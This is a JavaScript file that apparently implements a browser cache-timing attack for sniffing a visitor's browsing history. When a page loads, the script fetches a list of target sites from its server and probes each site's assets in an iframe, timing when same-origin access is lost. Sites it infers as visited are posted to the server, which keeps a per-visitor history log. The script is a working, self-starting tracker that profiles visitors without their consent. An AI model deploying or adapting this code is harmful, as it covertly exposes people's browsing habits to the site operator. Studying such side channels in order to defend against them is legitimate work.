var targets = [];

/*************************
 * CONFIGURABLE SETTINGS *
 *************************/

var TIME_LIMIT = 5;
var MAX_ATTEMPTS = 1;

/**********************
 * MAIN STATE MACHINE *
 **********************/

var log_area;

var target_off = 0;
var attempt = 0;
var confirmed_visited = false;

var asset_url, app_name;
var wait_cycles;

var frame_ready = false;

var start, stop, urls;

/* The frame points to about:blank. Initialize a new test, giving the
   about:blank frame some time to fully load. */
function perform_check() {
  wait_cycles = 0;

  setTimeout(wait_for_read1, 1);
}


/* Confirm that about:blank is loaded correctly. */
function wait_for_read1() {
  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  try {
    if (frames['f'].location.href != 'about:blank') throw 1;

    frames['f'].stop();
    document.getElementById('f').src ='javascript:"<body onload=\'parent.frame_ready = true\'>"';

    setTimeout(wait_for_read2, 1);
  } catch (e) {
    setTimeout(wait_for_read1, 1);
  }
}

function wait_for_read2() {
  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  if (!frame_ready) {
    setTimeout(wait_for_read2, 1);
  } else {
    frames['f'].stop();
    setTimeout(navigate_to_target, 1);
  }
}

function set_authenticity_token(xhr) {
  xhr.setRequestHeader('X-CSRF-Token', $('meta[name="csrf-token"]').attr('content'))
}

/* Navigate the frame to the target URL. */
function navigate_to_target() {
  cycles = 0;
  setTimeout(wait_for_noread, 1);

  urls++;
  document.getElementById("f").src = asset_url;
}

/* The browser is now trying to load the destination URL. Let's see if
   we lose SOP access before we hit TIME_LIMIT. If yes, we have a cache
   hit. If not, seems like cache miss. In both cases, abort pending
   navigation by pointing the frame back to about:blank when done. */
function wait_for_noread() {
  try {
    if (frames['f'].location.href == undefined) throw 1;

    if (cycles++ >= TIME_LIMIT) {
      maybe_test_next();
      return;
    }
    setTimeout(wait_for_noread, 1);
  } catch (e) {
    confirmed_visited = true;
    maybe_test_next();
  }
}

/* Just a logging helper. */

function log_text(str, cssclass) {

  var el = document.createElement('li');
  var tx = document.createTextNode(str);

  el.className = cssclass;
  el.appendChild(tx);

  log_area.appendChild(el);
}

/* Decides what to do next. May schedule another attempt for the same target,
   select a new target, or wrap up the scan. */

function maybe_test_next() {
  frame_ready = false;

  document.getElementById('f').src = 'about:blank';

  if (target_off < targets.length) {
    if (confirmed_visited) {
      $.ajax({
        url: "/history",
        type: "post",
        data: { app_name },
        beforeSend: set_authenticity_token
      });
    }

    if (confirmed_visited || attempt == MAX_ATTEMPTS * targets[target_off].urls.length) {
      confirmed_visited = false;
      target_off++;
      attempt = 0;

      maybe_test_next();
    } else {
      asset_url = targets[target_off].urls[attempt % targets[target_off].urls.length];
      app_name = targets[target_off].name;

      attempt++;
      perform_check();
    }
  } else {
    en = (new Date()).getTime();
    document.getElementById('status').innerHTML = 'Tested ' + urls + ' individual URLs in ' + (en - st) + ' ms.';
  }
}

/* Start by pulling eligible apps from server,
   then begin testing all apps */
function fetch_apps_and_examine() {
  $.ajax({
    url: "/apps",
    success: function(response) {
      targets = response
      maybe_test_next();
      display_history();
    }
  });  
}

/* Finish by fetching user's history,
   then displaying them in the logs */
function display_history() {
  $.ajax({
    url: "/apps_users",
    success: function(response) {
      var targetLength = targets.length;
      for (var i = 0; i < targetLength; i++) {
        appName = targets[i].name
        if (response.hasOwnProperty(appName))
          log_text('Visited: ' + appName + ' (last confirmed at ' + response[appName] + ')', 'visited');
      }
      for (var i = 0; i < targetLength; i++) {
        appName = targets[i].name
        if (!response.hasOwnProperty(appName))
          log_text('Not visited: ' + appName, 'not_visited');
      }
    }
  });
}

/* Allow user to destroy history of apps
   (obviously for debugging purposes) */
function reset_data() {
  $.ajax({
    url: "/clear",
    type: "delete",
    success: function(response) {
      alert('History cleared!')
    },
    error: function(response) {
      alert('There was an error clearing the history!')
    },
    beforeSend: set_authenticity_token
  });
}

window.onload = function start_stuff() {
  target_off = 0;
  attempt = 0;
  confirmed_visited = false;

  log_area = document.getElementById('log');
  log_area.innerHTML = '';

  st = (new Date()).getTime();
  urls = 0;

  fetch_apps_and_examine();
}
